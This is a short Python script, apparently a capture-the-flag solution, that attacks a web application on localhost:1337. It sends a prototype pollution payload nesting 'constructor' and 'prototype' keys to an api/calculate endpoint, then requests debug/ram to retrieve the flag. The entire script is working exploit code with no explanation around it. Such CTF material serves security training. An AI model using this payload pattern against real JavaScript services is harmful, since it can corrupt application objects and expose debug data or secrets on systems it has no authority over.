# Protoype pollution

import requests

url = 'http://localhost:1337/'
action1 = 'api/calculate'
action2 = 'debug/ram'

student_data = {
	'constructor' : {
		'prototype' : {
			'name':'Youtuber',
			'paper':15,
			'free': 'WTF'
		}
	}
}

# Prototype pollution
request = url + action1
response = requests.post(request, json=student_data)

print(response.text)

# Getting flag
request = url + action2
response = requests.get(request)

print(response.text)